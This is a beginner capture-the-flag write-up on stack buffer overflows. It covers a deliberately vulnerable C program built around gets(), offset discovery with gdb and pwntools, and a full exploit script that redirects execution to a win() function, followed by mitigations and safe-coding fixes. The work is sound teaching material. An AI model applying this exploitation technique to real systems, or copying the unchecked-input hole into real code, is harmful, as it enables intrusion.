---
title: "Buffer Overflow 101: Your First Stack Smash"
description: "A beginner's guide to exploiting a simple buffer overflow vulnerability to gain control of program execution."
pubDate: 2024-11-28
category: "pwn"
difficulty: "easy"
ctf: "CyberClub Workshop Series"
author: "Marcus Williams"
tags: ["buffer-overflow", "stack", "binary-exploitation", "x86"]
---

## Introduction

Buffer overflow vulnerabilities are one of the most fundamental security issues in software. In this writeup, we'll exploit a simple buffer overflow to overwrite the return address and redirect program execution.

## The Vulnerable Program

Here's the C source code we're attacking:

```c
#include <stdio.h>
#include <string.h>

void win() {
    printf("Congratulations! You've exploited the buffer overflow!\n");
    printf("Flag: flag{buff3r_0v3rfl0w_m4st3r}\n");
}

void vuln() {
    char buffer[64];
    printf("Enter your name: ");
    gets(buffer);  // Dangerous! No bounds checking
    printf("Hello, %s!\n", buffer);
}

int main() {
    printf("Welcome to Buffer Overflow 101\n");
    vuln();
    printf("Goodbye!\n");
    return 0;
}
```

## The Vulnerability

The program uses `gets()`, which is notoriously unsafe because it doesn't check the buffer size. We can write more than 64 bytes and overflow into adjacent memory.

## Understanding the Stack

When `vuln()` is called, the stack looks like this:

```
[High addresses]
+------------------+
| Return Address   | <- We want to overwrite this!
+------------------+
| Saved EBP        |
+------------------+
| buffer[63]       |
| ...              |
| buffer[0]        | <- Our input starts here
+------------------+
[Low addresses]
```

## Finding the Offset

First, let's determine how many bytes we need to reach the return address:

```bash
# Generate a pattern
$ gdb ./vuln
(gdb) run < <(python3 -c "print('A'*100)")

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

The program crashed trying to jump to `0x41414141` (the ASCII code for 'A'). This means we've successfully overwritten the return address!

Let's find the exact offset:

```python
# Create a cyclic pattern
from pwn import *

pattern = cyclic(100)
print(pattern)
```

Run the program with this pattern and check the crash address, then:

```python
offset = cyclic_find(0x61616161)  # The crashed address
print(f"Offset: {offset}")  # Output: 72
```

## Exploitation

Now we need the address of the `win()` function:

```bash
$ objdump -d vuln | grep win
080491a6 <win>:
```

The `win()` function is at `0x080491a6`. Now we can build our exploit:

```python
from pwn import *

# Connect to the challenge
p = process('./vuln')
# p = remote('challenge.cyberclub.local', 1337)

# Address of win() function
win_addr = 0x080491a6

# Build the payload
offset = 72
payload = b'A' * offset
payload += p32(win_addr)  # Overwrite return address

# Send the payload
p.sendline(payload)

# Get the flag
print(p.recvall().decode())
```

## Running the Exploit

```bash
$ python3 exploit.py
[+] Starting local process './vuln': pid 12345
Welcome to Buffer Overflow 101
Enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAA�!
Congratulations! You've exploited the buffer overflow!
Flag: flag{buff3r_0v3rfl0w_m4st3r}
```

## Success!

We've successfully exploited our first buffer overflow! The program jumped to the `win()` function instead of returning normally.

## Key Concepts

1. **Buffer Overflow** - Writing beyond allocated memory boundaries
2. **Return Address** - The stack stores where the program should return after a function
3. **Control Flow Hijacking** - Overwriting the return address to jump anywhere
4. **Stack Layout** - Understanding memory organization is crucial

## Modern Protections

In real-world scenarios, you'll encounter protections like:

- **ASLR** - Address Space Layout Randomization
- **Stack Canaries** - Values that detect buffer overflows
- **NX/DEP** - Non-executable stack
- **PIE** - Position Independent Executables

We'll cover bypassing these in future writeups!

## Prevention

Secure coding practices:
```c
// Instead of gets()
fgets(buffer, sizeof(buffer), stdin);

// Or use safer alternatives
char buffer[64];
if (scanf("%63s", buffer) != 1) {
    // Handle error
}
```

## Practice Resources

- [pwnable.kr](https://pwnable.kr/) - Binary exploitation challenges
- [ROP Emporium](https://ropemporium.com/) - Return-Oriented Programming practice
- [Exploit Education](https://exploit.education/) - Vulnerable VMs for practice

---

*This is just the beginning! Next up: Return-Oriented Programming (ROP) chains!*
